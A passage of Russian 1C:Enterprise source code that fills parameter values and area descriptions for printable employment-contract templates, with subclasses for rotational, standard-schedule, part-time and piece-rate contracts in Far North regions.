	ЗначенияПараметров.Вставить(""Сотрудник_УдостоверениеЛичности_ДатаВыдачи"", Формат(Сотрудник.УдостоверениеЛичности.ДатаВыдачи, ""ДФ=dd.MM.yyyy""));
	ЗначенияПараметров.Вставить(""Сотрудник_УдостоверениеЛичности_КемВыдано"", Сотрудник.УдостоверениеЛичности.КемВыдан);
	ЗначенияПараметров.Вставить(""Сотрудник_УдостоверениеЛичности_КодПодразделения"", Сотрудник.УдостоверениеЛичности.КодПодразделения);
	ЗначенияПараметров.Вставить(""Сотрудник_УдостоверениеЛичности_Номер"", Сотрудник.УдостоверениеЛичности.Номер);
	ЗначенияПараметров.Вставить(""Сотрудник_УдостоверениеЛичности_Серия"", Сотрудник.УдостоверениеЛичности.Серия);
	ЗначенияПараметров.Вставить(""Сотрудник_ФИО_ФамилияИмяОтчество"", Стандартные_ФИО_ФамилияИмяОтчество(Сотрудник.ФИО));
	ЗначенияПараметров.Вставить(""Сотрудник_ФИО_ФамилияИО"", Стандартные_ФИО_ФамилияИО(Сотрудник.ФИО));
	
	#КонецОбласти
	#Область ОплатаТруда
	
	ЗначенияПараметров.Вставить(""ОплатаТруда_ОкладСтавка"", ОплатаТруда.ОкладСтавка);
	ЗначенияПараметров.Вставить(""ОплатаТруда_НДФЛ"", ОплатаТруда.СтавкаНДФЛ);
	ЗначенияПараметров.Вставить(""ОплатаТруда_Вид"", ОплатаТруда_ФорматОсновнойПоказатель(ОплатаТруда.ОсновнойПоказатель));
	ЗначенияПараметров.Вставить(""ОплатаТруда_РайонныйКоэффициент"", ОплатаТруда.РайонныйКоэффициент);
	//ЗначенияПараметров.Вставить(""ОплатаТруда_ПроцентСевернойНадбавки"", Формат(ОплатаТруда.ПроцентСевернойНадбавки, ""ЧН=0; ЧГ=""));
	
	#КонецОбласти	
	#Область УсловияТрудаНаРабочемМесте
	
	ЗначенияПараметров.Вставить(""УсловияТрудаНаРабочемМесте_Вид"", УсловияТрудаНаРабочемМесте_Представление(УсловияТрудаНаРабочемМесте));
	
	#КонецОбласти
	#Область Приказы
	
	ЗначенияПараметров.Вставить(""ПриказВнутреннегоТрудовогоРаспорядка_Номер"", 3);
	ЗначенияПараметров.Вставить(""ПриказВнутреннегоТрудовогоРаспорядка_Дата"", Формат('20170901', ""ДФ=dd.MM.yyyy""));
	ЗначенияПараметров.Вставить(""ПриказПоложениеОбОплатеТрудаИМатСтимулировании_Номер"", 3);
	ЗначенияПараметров.Вставить(""ПриказПоложениеОбОплатеТрудаИМатСтимулировании_Дата"", Формат('20170901', ""ДФ=dd.MM.yyyy""));
	ЗначенияПараметров.Вставить(""ПриказПоложениеОХраненииИИспользованииПерсональныхДанных_Номер"", 3);
	ЗначенияПараметров.Вставить(""ПриказПоложениеОХраненииИИспользованииПерсональныхДанных_Дата"", Формат('20170901', ""ДФ=dd.MM.yyyy""));
	ЗначенияПараметров.Вставить(""ПриказПоложениеОВахтовомМетодеОрганизацииРабот_Номер"", 3);
	ЗначенияПараметров.Вставить(""ПриказПоложениеОВахтовомМетодеОрганизацииРабот_Дата"", Формат('20170901', ""ДФ=dd.MM.yyyy""));
	ЗначенияПараметров.Вставить(""ПриказПоложениеОСлужебныхКомандировках_Номер"", 3);
	ЗначенияПараметров.Вставить(""ПриказПоложениеОСлужебныхКомандировках_Дата"", Формат('20170901', ""ДФ=dd.MM.yyyy""));
	
	#КонецОбласти
	
	ПФ_MXL_ТрудовойДоговор_ЗначенияПараметров = ЗначенияПараметров;       
	
	Возврат ПФ_MXL_ТрудовойДоговор_ЗначенияПараметров;                  
	
КонецФункции                                                                                        
Функция ПФ_MXL_ТрудовойДоговор_ОписаниеОбластей(Знач this) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговор_ОписаниеОбластей;
	
	ПФ_MXL_ТрудовойДоговор_ОписаниеОбластей = Новый Структура;

	#Область ПФ_MXL_ТрудовойДоговор_Области
	
	#Область ПФ_MXL_ТрудовойДоговор_Область_Договор
	//TODO: Для макетов MXL предусмотреть получение параметров области непосредственно из макета. Получать области и сохранять в описании областей
	
	ИмяОбласти        = ""Договор"";
	ТипОбласти        = ""Общая"";
	
	ПараметрыОбласти  = Новый Массив;
	
	#Область Договор
	
	ПараметрыОбласти.Добавить(""Договор_ДатаЛокальныйФормат"");
	ПараметрыОбласти.Добавить(""Договор_ДатаНачалаЛокальныйФормат"");
	ПараметрыОбласти.Добавить(""Договор_ДатаОкончанияЛокальныйФормат"");
	ПараметрыОбласти.Добавить(""Договор_ДлительностьИспытательногоСрока"");
	ПараметрыОбласти.Добавить(""Договор_Номер"");
	ПараметрыОбласти.Добавить(""Договор_ВидЗанятости"");
	ПараметрыОбласти.Добавить(""Договор_МестоВыполненияРабот"");
	
	
	#КонецОбласти
	#Область Организация
	
	ПараметрыОбласти.Добавить(""Организация_АдресЮридический"");
	ПараметрыОбласти.Добавить(""Организация_ОГРН"");
	ПараметрыОбласти.Добавить(""Организация_ИНН"");
	ПараметрыОбласти.Добавить(""Организация_КПП"");
	ПараметрыОбласти.Добавить(""Организация_НаименованиеКраткое"");
	ПараметрыОбласти.Добавить(""Организация_НаименованиеСокращенное"");
	ПараметрыОбласти.Добавить(""Организация_НаименованиеПолное"");
	ПараметрыОбласти.Добавить(""Организация_Телефон"");
	
	#КонецОбласти
	#Область Руководитель
	
	ПараметрыОбласти.Добавить(""Руководитель_Должность_Наименование"");
	ПараметрыОбласти.Добавить(""Руководитель_Должность_НаименованиеРодительныйПадеж"");
	ПараметрыОбласти.Добавить(""Руководитель_ОснованиеРодительныйПадеж"");
	ПараметрыОбласти.Добавить(""Руководитель_ФИО_ФамилияИмяОтчествоРодительныйПадеж"");
	ПараметрыОбласти.Добавить(""Руководитель_ФИО_ФамилияИО"");
	
	#КонецОбласти 
	#Область Сотрудник
	
	ПараметрыОбласти.Добавить(""Сотрудник_АдресРегистрации"");
	ПараметрыОбласти.Добавить(""Сотрудник_ДатаРождения"");
	ПараметрыОбласти.Добавить(""Сотрудник_ГрафикРаботы"");
	//ПараметрыОбласти.Добавить(""Сотрудник_Должность_Наименование"");
	ПараметрыОбласти.Добавить(""Сотрудник_Должность_НаименованиеРодительныйПадеж"");
	ПараметрыОбласти.Добавить(""Сотрудник_Должность_НаименованиеТворительныйПадеж"");
	ПараметрыОбласти.Добавить(""Сотрудник_ИНН"");
	ПараметрыОбласти.Добавить(""Сотрудник_Подразделение_Наименование"");
	ПараметрыОбласти.Добавить(""Сотрудник_СНИЛС"");
	ПараметрыОбласти.Добавить(""Сотрудник_УдостоверениеЛичности_Представление"");
	ПараметрыОбласти.Добавить(""Сотрудник_УдостоверениеЛичности_ДатаВыдачи"");
	ПараметрыОбласти.Добавить(""Сотрудник_УдостоверениеЛичности_КемВыдано"");
	ПараметрыОбласти.Добавить(""Сотрудник_УдостоверениеЛичности_КодПодразделения"");
	ПараметрыОбласти.Добавить(""Сотрудник_УдостоверениеЛичности_Номер"");
	ПараметрыОбласти.Добавить(""Сотрудник_УдостоверениеЛичности_Серия"");
	ПараметрыОбласти.Добавить(""Сотрудник_ФИО_ФамилияИмяОтчество"");
	ПараметрыОбласти.Добавить(""Сотрудник_ФИО_ФамилияИО"");
	
	#КонецОбласти
	#Область ОплатаТруда
	
	ПараметрыОбласти.Добавить(""ОплатаТруда_Вид"");
	ПараметрыОбласти.Добавить(""ОплатаТруда_ОкладСтавка"");
	ПараметрыОбласти.Добавить(""ОплатаТруда_РайонныйКоэффициент"");
	ПараметрыОбласти.Добавить(""ОплатаТруда_Форма"");
	ПараметрыОбласти.Добавить(""ОплатаТруда_НДФЛ"");
	
//	ПараметрыОбласти.Добавить(""ОплатаТруда_ПроцентСевернойНадбавки"");

	#КонецОбласти	
	#Область УсловияТрудаНаРабочемМесте

	ПараметрыОбласти.Добавить(""УсловияТрудаНаРабочемМесте_Вид"");

	#КонецОбласти	
	#Область Банк
	
	ПараметрыОбласти.Добавить(""Банк_Наименование"");
	ПараметрыОбласти.Добавить(""Банк_Город"");
	ПараметрыОбласти.Добавить(""Банк_КорреспондентскийСчет"");
	ПараметрыОбласти.Добавить(""Банк_БИК"");
	
	#КонецОбласти
	#Область Приказы
	
	ПараметрыОбласти.Добавить(""ПриказВнутреннегоТрудовогоРаспорядка_Номер"");
	ПараметрыОбласти.Добавить(""ПриказВнутреннегоТрудовогоРаспорядка_Дата"");
	ПараметрыОбласти.Добавить(""ПриказПоложениеОбОплатеТрудаИМатСтимулировании_Номер"");
	ПараметрыОбласти.Добавить(""ПриказПоложениеОбОплатеТрудаИМатСтимулировании_Дата"");
	ПараметрыОбласти.Добавить(""ПриказПоложениеОХраненииИИспользованииПерсональныхДанных_Номер"");
	ПараметрыОбласти.Добавить(""ПриказПоложениеОХраненииИИспользованииПерсональныхДанных_Дата"");
	ПараметрыОбласти.Добавить(""ПриказПоложениеОВахтовомМетодеОрганизацииРабот_Номер"");
	ПараметрыОбласти.Добавить(""ПриказПоложениеОВахтовомМетодеОрганизацииРабот_Дата"");
	ПараметрыОбласти.Добавить(""ПриказПоложениеОСлужебныхКомандировках_Номер"");
	ПараметрыОбласти.Добавить(""ПриказПоложениеОСлужебныхКомандировках_Дата"");
		
	#КонецОбласти 
	Макет_Макет_ДобавитьОписаниеОбласти(ПФ_MXL_ТрудовойДоговор_ОписаниеОбластей, ИмяОбласти, ТипОбласти, ПараметрыОбласти);
	
	ПараметрыОбласти = Неопределено;
	
	#КонецОбласти
	
	#КонецОбласти
	
	Возврат ПФ_MXL_ТрудовойДоговор_ОписаниеОбластей;
	
КонецФункции 
Функция ПФ_MXL_ТрудовойДоговор(Знач this) Экспорт
	
	ООП_parent(this);
		
	this.Имя      = ""ПФ_MXL_ТрудовойДоговор"";
	this.Тип      = ""MXL"";
	this.Области  = ПФ_MXL_ТрудовойДоговор_ОписаниеОбластей(this);
	
	Возврат this;
	
КонецФункции //ПФ_MXL_ТрудовойДоговор

// private
Функция ПФ_MXL_ТрудовойДоговор_Include()
	
	ООП_Include(""Макет.Макет"");
	
	ООП_ЗарегистрироватьКласс(""ПФ_MXL_ТрудовойДоговор"", ""Структура"", ""Макет.Макет"");
	
КонецФункции
Функция ПФ_MXL_ТрудовойДоговор_ФорматВидЗанятости(Знач ВидЗанятости)

	Перем ФорматВидЗанятости;
	
	ФорматВидЗанятости = """";
	
	Если (Перечисления.ВидыЗанятости.ОсновноеМестоРаботы = ВидЗанятости) Тогда
		ФорматВидЗанятости = ""основной работой"";
	ИначеЕсли (Перечисления.ВидыЗанятости.ВнутреннееСовместительство = ВидЗанятости) Тогда
		ФорматВидЗанятости = ""работой по внутреннему совместительству"";
	ИначеЕсли (Перечисления.ВидыЗанятости.Совместительство = ВидЗанятости) Тогда
		ФорматВидЗанятости = ""работой по внешнему совместительству"";
	ИначеЕсли (Перечисления.ВидыЗанятости.Подработка = ВидЗанятости) Тогда
		ФорматВидЗанятости = ""подработкой"";
	Иначе
		ВызватьИсключение ""ВидЗанятости содержит недопустимое значение """""" + ВидЗанятости +""""""."";
	КонецЕсли;
	
	Возврат ФорматВидЗанятости;

КонецФункции
Функция ПФ_MXL_ТрудовойДоговор_ФорматТерриториальныеУсловия(Знач ТерриториальныеУсловия)

	Перем ФорматТерриториальныеУсловия; // Возвращаемое значение
	
	ФорматТерриториальныеУсловия = """";
	
	Если (Справочники.ТерриториальныеУсловияПФР.РКС = ТерриториальныеУсловия) Тогда
		ФорматТерриториальныеУсловия = ""относится к районам Крайнего Севера"";
	ИначеЕсли (Справочники.ТерриториальныеУсловияПФР.МКС = ТерриториальныеУсловия) Тогда 
		ФорматТерриториальныеУсловия = ""относится к местностям приравненным к районам Крайнего Севера"";	
	Иначе
		ФорматТерриториальныеУсловия = ""не относится к районам Крайнего Севера и местностям приравненным к районам Крайнего Севера"";
	КонецЕсли; 

	Возврат ФорматТерриториальныеУсловия;
 
КонецФункции
 
#КонецОбласти
#Область class_ПФ_MXL_ТрудовойДоговорИТРВахтаРКС

// public
Процедура ПФ_MXL_ТрудовойДоговорИТРВахтаРКС_ВТабличныйДокумент(ЗначенияПараметровМакета, Знач Макет, Знач ОписанияОбластей, Знач ПечатнаяФорма) Экспорт
	
	ПФ_MXL_ТрудовойДоговор_ВТабличныйДокумент(ЗначенияПараметровМакета, Макет, ОписанияОбластей, ПечатнаяФорма);
	
КонецПроцедуры                   
Функция ПФ_MXL_ТрудовойДоговорИТРВахтаРКС_ЗначенияПараметров(Знач Макет, Знач Данные) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорИТРВахтаРКС_ЗначенияПараметров; // Возвращаемое значение
	
	Перем ЗначенияПараметров;
	
	ЗначенияПараметров = ПФ_MXL_ТрудовойДоговор_ЗначенияПараметров(Макет, Данные);
	//ЗначенияПараметров.Вставить(""Сотрудник_ГрафикРаботы"", Данные.Сотрудник.ГрафикРаботы);
	ЗначенияПараметров.Вставить(""Сотрудник_ГрафикРаботы"", ""вахтовый метод работы, продолжительность вахты составляет 2 месяца, продолжительность междувахтового отдыха составляет 1 месяц"");
	ЗначенияПараметров.Вставить(""ОплатаТруда_Форма"", ""повременно-премиальная форма оплаты труда"");

	ПФ_MXL_ТрудовойДоговорИТРВахтаРКС_ЗначенияПараметров = ЗначенияПараметров;       
	
	Возврат ПФ_MXL_ТрудовойДоговорИТРВахтаРКС_ЗначенияПараметров;                  
	
КонецФункции                                                                                        
Функция ПФ_MXL_ТрудовойДоговорИТРВахтаРКС_ОписаниеОбластей(Знач this) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорИТРВахтаРКС_ОписаниеОбластей;
	
	ПФ_MXL_ТрудовойДоговорИТРВахтаРКС_ОписаниеОбластей = ПФ_MXL_ТрудовойДоговор_ОписаниеОбластей(this);

	#Область ПФ_MXL_ТрудовойДоговорИТРВахтаРКС_Области
	
	#КонецОбласти
	
	Возврат ПФ_MXL_ТрудовойДоговорИТРВахтаРКС_ОписаниеОбластей;
	
КонецФункции 
Функция ПФ_MXL_ТрудовойДоговорИТРВахтаРКС(Знач this) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорИТРВахтаРКС;
	
	ООП_parent(this);
	
	this.Имя = ""ПФ_MXL_ТрудовойДоговорИТРВахтаРКС"";
	this.Тип = ""MXL"";
	this.Области = ПФ_MXL_ТрудовойДоговорИТРВахтаРКС_ОписаниеОбластей(this);
	
	ПФ_MXL_ТрудовойДоговорИТРВахтаРКС = this;
	
	Возврат ПФ_MXL_ТрудовойДоговорИТРВахтаРКС;
	
КонецФункции //ПФ_MXL_ТрудовойДоговорИТРВахтаРКС

// private
Функция ПФ_MXL_ТрудовойДоговорИТРВахтаРКС_Include()
	
	ООП_Include(""ПФ_MXL_ТрудовойДоговор"");
	
	ООП_ЗарегистрироватьКласс(""ПФ_MXL_ТрудовойДоговорИТРВахтаРКС"", ""Структура"", ""Макет.Макет"");
	
КонецФункции

#КонецОбласти
#Область class_ПФ_MXL_ТрудовойДоговорИТРОсновнойГрафикРКС

// public
Процедура ПФ_MXL_ТрудовойДоговорИТРОсновнойГрафикРКС_ВТабличныйДокумент(ЗначенияПараметровМакета, Знач Макет, Знач ОписанияОбластей, Знач ПечатнаяФорма) Экспорт
	
	ПФ_MXL_ТрудовойДоговор_ВТабличныйДокумент(ЗначенияПараметровМакета, Макет, ОписанияОбластей, ПечатнаяФорма);
	
КонецПроцедуры                   
Функция ПФ_MXL_ТрудовойДоговорИТРОсновнойГрафикРКС_ЗначенияПараметров(Знач Макет, Знач Данные) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорИТРОсновнойГрафикРКС_ЗначенияПараметров; // Возвращаемое значение
	
	Перем ЗначенияПараметров;
	
	ЗначенияПараметров = ПФ_MXL_ТрудовойДоговор_ЗначенияПараметров(Макет, Данные);
	//ЗначенияПараметров.Вставить(""Сотрудник_ГрафикРаботы"", Данные.Сотрудник.ГрафикРаботы);
	ЗначенияПараметров.Вставить(""Сотрудник_ГрафикРаботы"", ""основной с 5-ти дневной рабочей неделей и 2-мя выходными днями – суббота, воскресенье"");
	ЗначенияПараметров.Вставить(""ОплатаТруда_Форма"", ""повременно-премиальная форма оплаты труда"");

	ПФ_MXL_ТрудовойДоговорИТРОсновнойГрафикРКС_ЗначенияПараметров = ЗначенияПараметров;       
	
	Возврат ПФ_MXL_ТрудовойДоговорИТРОсновнойГрафикРКС_ЗначенияПараметров;                  
	
КонецФункции                                                                                        
Функция ПФ_MXL_ТрудовойДоговорИТРОсновнойГрафикРКС_ОписаниеОбластей(Знач this) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорИТРОсновнойГрафикРКС_ОписаниеОбластей;
	
	ПФ_MXL_ТрудовойДоговорИТРОсновнойГрафикРКС_ОписаниеОбластей = ПФ_MXL_ТрудовойДоговор_ОписаниеОбластей(this);

	#Область ПФ_MXL_ТрудовойДоговорИТРОсновнойГрафикРКС_Области
	
	#КонецОбласти
	
	Возврат ПФ_MXL_ТрудовойДоговорИТРОсновнойГрафикРКС_ОписаниеОбластей;
	
КонецФункции 
Функция ПФ_MXL_ТрудовойДоговорИТРОсновнойГрафикРКС(Знач this) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорИТРОсновнойГрафикРКС;
	
	ООП_parent(this);
	
	this.Имя = ""ПФ_MXL_ТрудовойДоговорИТРОсновнойГрафикРКС"";
	this.Тип = ""MXL"";
	this.Области = ПФ_MXL_ТрудовойДоговорИТРОсновнойГрафикРКС_ОписаниеОбластей(this);
	
	ПФ_MXL_ТрудовойДоговорИТРОсновнойГрафикРКС = this;
	
	Возврат ПФ_MXL_ТрудовойДоговорИТРОсновнойГрафикРКС;
	
КонецФункции //ПФ_MXL_ТрудовойДоговорИТРОсновнойГрафикРКС

// private
Функция ПФ_MXL_ТрудовойДоговорИТРОсновнойГрафикРКС_Include()
	
	ООП_Include(""ПФ_MXL_ТрудовойДоговор"");
	
	ООП_ЗарегистрироватьКласс(""ПФ_MXL_ТрудовойДоговорИТРОсновнойГрафикРКС"", ""Структура"", ""Макет.Макет"");
	
КонецФункции

#КонецОбласти
#Область class_ПФ_MXL_ТрудовойДоговорИТРСовместительствоРКС

// public
Процедура ПФ_MXL_ТрудовойДоговорИТРСовместительствоРКС_ВТабличныйДокумент(ЗначенияПараметровМакета, Знач Макет, Знач ОписанияОбластей, Знач ПечатнаяФорма) Экспорт
	
	ПФ_MXL_ТрудовойДоговор_ВТабличныйДокумент(ЗначенияПараметровМакета, Макет, ОписанияОбластей, ПечатнаяФорма);
	
КонецПроцедуры                   
Функция ПФ_MXL_ТрудовойДоговорИТРСовместительствоРКС_ЗначенияПараметров(Знач Макет, Знач Данные) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорИТРСовместительствоРКС_ЗначенияПараметров; // Возвращаемое значение
	
	Перем ЗначенияПараметров;
	
	ЗначенияПараметров = ПФ_MXL_ТрудовойДоговор_ЗначенияПараметров(Макет, Данные);
	//ЗначенияПараметров.Вставить(""Сотрудник_ГрафикРаботы"", Данные.Сотрудник.ГрафикРаботы);
	ЗначенияПараметров.Вставить(""Сотрудник_ГрафикРаботы"", ""основной с 5-ти дневной рабочей неделей и 2-мя выходными днями – суббота, воскресенье,""
	+ "" продолжительность рабочего времени – 20 часов в неделю/4 часа в день (для мужчин) и 18 часов в неделю/3 часа 35 минут для женщин. Начало работы 08 часов 30 минут"");
	ЗначенияПараметров.Вставить(""ОплатаТруда_Форма"", ""повременно-премиальная форма оплаты труда"");

	ПФ_MXL_ТрудовойДоговорИТРСовместительствоРКС_ЗначенияПараметров = ЗначенияПараметров;       
	
	Возврат ПФ_MXL_ТрудовойДоговорИТРСовместительствоРКС_ЗначенияПараметров;                  
	
КонецФункции                                                                                        
Функция ПФ_MXL_ТрудовойДоговорИТРСовместительствоРКС_ОписаниеОбластей(Знач this) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорИТРСовместительствоРКС_ОписаниеОбластей;
	
	ПФ_MXL_ТрудовойДоговорИТРСовместительствоРКС_ОписаниеОбластей = ПФ_MXL_ТрудовойДоговор_ОписаниеОбластей(this);

	#Область ПФ_MXL_ТрудовойДоговорИТРСовместительствоРКС_Области
	
	#КонецОбласти
	
	Возврат ПФ_MXL_ТрудовойДоговорИТРСовместительствоРКС_ОписаниеОбластей;
	
КонецФункции 
Функция ПФ_MXL_ТрудовойДоговорИТРСовместительствоРКС(Знач this) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорИТРСовместительствоРКС;
	
	ООП_parent(this);
	
	this.Имя = ""ПФ_MXL_ТрудовойДоговорИТРСовместительствоРКС"";
	this.Тип = ""MXL"";
	this.Области = ПФ_MXL_ТрудовойДоговорИТРСовместительствоРКС_ОписаниеОбластей(this);
	
	ПФ_MXL_ТрудовойДоговорИТРСовместительствоРКС = this;
	
	Возврат ПФ_MXL_ТрудовойДоговорИТРСовместительствоРКС;
	
КонецФункции //ПФ_MXL_ТрудовойДоговорИТРСовместительствоРКС

// private
Функция ПФ_MXL_ТрудовойДоговорИТРСовместительствоРКС_Include()
	
	ООП_Include(""ПФ_MXL_ТрудовойДоговор"");
	
	ООП_ЗарегистрироватьКласс(""ПФ_MXL_ТрудовойДоговорИТРСовместительствоРКС"", ""Структура"", ""Макет.Макет"");
	
КонецФункции

#КонецОбласти
#Область class_ПФ_MXL_ТрудовойДоговорРабочиеВахтаРКС

// public
Процедура ПФ_MXL_ТрудовойДоговорРабочиеВахтаРКС_ВТабличныйДокумент(ЗначенияПараметровМакета, Знач Макет, Знач ОписанияОбластей, Знач ПечатнаяФорма) Экспорт
	
	ПФ_MXL_ТрудовойДоговор_ВТабличныйДокумент(ЗначенияПараметровМакета, Макет, ОписанияОбластей, ПечатнаяФорма);
	
КонецПроцедуры                   
Функция ПФ_MXL_ТрудовойДоговорРабочиеВахтаРКС_ЗначенияПараметров(Знач Макет, Знач Данные) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорРабочиеВахтаРКС_ЗначенияПараметров; // Возвращаемое значение
	
	Перем ЗначенияПараметров;
	
	ЗначенияПараметров = ПФ_MXL_ТрудовойДоговор_ЗначенияПараметров(Макет, Данные);
	//ЗначенияПараметров.Вставить(""Сотрудник_ГрафикРаботы"", Данные.Сотрудник.ГрафикРаботы);
	ЗначенияПараметров.Вставить(""Сотрудник_ГрафикРаботы"", ""вахтовый метод работы, продолжительность вахты составляет 2 месяца, продолжительность междувахтового отдыха составляет 1 месяц. Характер работы – разъездной"");
	ЗначенияПараметров.Вставить(""ОплатаТруда_Форма"", ""повременно-премиальная форма оплаты труда"");

	ПФ_MXL_ТрудовойДоговорРабочиеВахтаРКС_ЗначенияПараметров = ЗначенияПараметров;       
	
	Возврат ПФ_MXL_ТрудовойДоговорРабочиеВахтаРКС_ЗначенияПараметров;                  
	
КонецФункции                                                                                        
Функция ПФ_MXL_ТрудовойДоговорРабочиеВахтаРКС_ОписаниеОбластей(Знач this) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорРабочиеВахтаРКС_ОписаниеОбластей;
	
	ПФ_MXL_ТрудовойДоговорРабочиеВахтаРКС_ОписаниеОбластей = ПФ_MXL_ТрудовойДоговор_ОписаниеОбластей(this);

	#Область ПФ_MXL_ТрудовойДоговорРабочиеВахтаРКС_Области
	
	#КонецОбласти
	
	Возврат ПФ_MXL_ТрудовойДоговорРабочиеВахтаРКС_ОписаниеОбластей;
	
КонецФункции 
Функция ПФ_MXL_ТрудовойДоговорРабочиеВахтаРКС(Знач this) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорРабочиеВахтаРКС;
	
	ООП_parent(this);
	
	this.Имя = ""ПФ_MXL_ТрудовойДоговорРабочиеВахтаРКС"";
	this.Тип = ""MXL"";
	this.Области = ПФ_MXL_ТрудовойДоговорРабочиеВахтаРКС_ОписаниеОбластей(this);
	
	ПФ_MXL_ТрудовойДоговорРабочиеВахтаРКС = this;
	
	Возврат ПФ_MXL_ТрудовойДоговорРабочиеВахтаРКС;
	
КонецФункции //ПФ_MXL_ТрудовойДоговорРабочиеВахтаРКС

// private
Функция ПФ_MXL_ТрудовойДоговорРабочиеВахтаРКС_Include()
	
	ООП_Include(""ПФ_MXL_ТрудовойДоговор"");
	
	ООП_ЗарегистрироватьКласс(""ПФ_MXL_ТрудовойДоговорРабочиеВахтаРКС"", ""Структура"", ""Макет.Макет"");
	
КонецФункции

#КонецОбласти
#Область class_ПФ_MXL_ТрудовойДоговорРабочиеОсновнойГрафикРКС

// public
Процедура ПФ_MXL_ТрудовойДоговорРабочиеОсновнойГрафикРКС_ВТабличныйДокумент(ЗначенияПараметровМакета, Знач Макет, Знач ОписанияОбластей, Знач ПечатнаяФорма) Экспорт
	
	ПФ_MXL_ТрудовойДоговор_ВТабличныйДокумент(ЗначенияПараметровМакета, Макет, ОписанияОбластей, ПечатнаяФорма);
	
КонецПроцедуры                   
Функция ПФ_MXL_ТрудовойДоговорРабочиеОсновнойГрафикРКС_ЗначенияПараметров(Знач Макет, Знач Данные) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорРабочиеОсновнойГрафикРКС_ЗначенияПараметров; // Возвращаемое значение
	
	Перем ЗначенияПараметров;
	
	ЗначенияПараметров = ПФ_MXL_ТрудовойДоговор_ЗначенияПараметров(Макет, Данные);
	//ЗначенияПараметров.Вставить(""Сотрудник_ГрафикРаботы"", Данные.Сотрудник.ГрафикРаботы);
	ЗначенияПараметров.Вставить(""Сотрудник_ГрафикРаботы"", ""основной с 5-ти дневной рабочей неделей и 2-мя выходными днями – суббота, воскресенье. Характер работы – разъездной"");
	ЗначенияПараметров.Вставить(""ОплатаТруда_Форма"", ""повременно-премиальная форма оплаты труда"");

	ПФ_MXL_ТрудовойДоговорРабочиеОсновнойГрафикРКС_ЗначенияПараметров = ЗначенияПараметров;       
	
	Возврат ПФ_MXL_ТрудовойДоговорРабочиеОсновнойГрафикРКС_ЗначенияПараметров;                  
	
КонецФункции                                                                                        
Функция ПФ_MXL_ТрудовойДоговорРабочиеОсновнойГрафикРКС_ОписаниеОбластей(Знач this) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорРабочиеОсновнойГрафикРКС_ОписаниеОбластей;
	
	ПФ_MXL_ТрудовойДоговорРабочиеОсновнойГрафикРКС_ОписаниеОбластей = ПФ_MXL_ТрудовойДоговор_ОписаниеОбластей(this);

	#Область ПФ_MXL_ТрудовойДоговорРабочиеОсновнойГрафикРКС_Области
	
	#КонецОбласти
	
	Возврат ПФ_MXL_ТрудовойДоговорРабочиеОсновнойГрафикРКС_ОписаниеОбластей;
	
КонецФункции 
Функция ПФ_MXL_ТрудовойДоговорРабочиеОсновнойГрафикРКС(Знач this) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорРабочиеОсновнойГрафикРКС;
	
	ООП_parent(this);
	
	this.Имя = ""ПФ_MXL_ТрудовойДоговорРабочиеОсновнойГрафикРКС"";
	this.Тип = ""MXL"";
	this.Области = ПФ_MXL_ТрудовойДоговорРабочиеОсновнойГрафикРКС_ОписаниеОбластей(this);
	
	ПФ_MXL_ТрудовойДоговорРабочиеОсновнойГрафикРКС = this;
	
	Возврат ПФ_MXL_ТрудовойДоговорРабочиеОсновнойГрафикРКС;
	
КонецФункции //ПФ_MXL_ТрудовойДоговорРабочиеОсновнойГрафикРКС

// private
Функция ПФ_MXL_ТрудовойДоговорРабочиеОсновнойГрафикРКС_Include()
	
	ООП_Include(""ПФ_MXL_ТрудовойДоговор"");
	
	ООП_ЗарегистрироватьКласс(""ПФ_MXL_ТрудовойДоговорРабочиеОсновнойГрафикРКС"", ""Структура"", ""Макет.Макет"");
	
КонецФункции

#КонецОбласти
#Область class_ПФ_MXL_ТрудовойДоговорСдельныеРасценки

// public
Процедура ПФ_MXL_ТрудовойДоговорСдельныеРасценки_ВТабличныйДокумент(ЗначенияПараметровМакета, Знач Макет, Знач ОписанияОбластей, Знач ПечатнаяФорма) Экспорт
	
	ПФ_MXL_ТрудовойДоговор_ВТабличныйДокумент(ЗначенияПараметровМакета, Макет, ОписанияОбластей, ПечатнаяФорма);
	
КонецПроцедуры                   
Функция ПФ_MXL_ТрудовойДоговорСдельныеРасценки_ЗначенияПараметров(Знач Макет, Знач Данные) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорСдельныеРасценки_ЗначенияПараметров; // Возвращаемое значение
	
	Перем ЗначенияПараметров;
	
	ЗначенияПараметров = ПФ_MXL_ТрудовойДоговор_ЗначенияПараметров(Макет, Данные);
	//ЗначенияПараметров.Вставить(""Сотрудник_ГрафикРаботы"", Данные.Сотрудник.ГрафикРаботы);
	ЗначенияПараметров.Вставить(""Сотрудник_ГрафикРаботы"", ""вахтовый метод работы, продолжительность вахты составляет 2 месяца, продолжительность междувахтового отдыха составляет 1 месяц. Характер работы – разъездной"");
	ЗначенияПараметров.Вставить(""ОплатаТруда_Форма"", ""сдельно-повременная форма оплаты труда"");

	ПФ_MXL_ТрудовойДоговорСдельныеРасценки_ЗначенияПараметров = ЗначенияПараметров;       
	
	Возврат ПФ_MXL_ТрудовойДоговорСдельныеРасценки_ЗначенияПараметров;                  
	
КонецФункции                                                                                        
Функция ПФ_MXL_ТрудовойДоговорСдельныеРасценки_ОписаниеОбластей(Знач this) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорСдельныеРасценки_ОписаниеОбластей;
	
	ПФ_MXL_ТрудовойДоговорСдельныеРасценки_ОписаниеОбластей = ПФ_MXL_ТрудовойДоговор_ОписаниеОбластей(this);

	#Область ПФ_MXL_ТрудовойДоговорСдельныеРасценки_Области
	
	#КонецОбласти
	
	Возврат ПФ_MXL_ТрудовойДоговорСдельныеРасценки_ОписаниеОбластей;
	
КонецФункции 
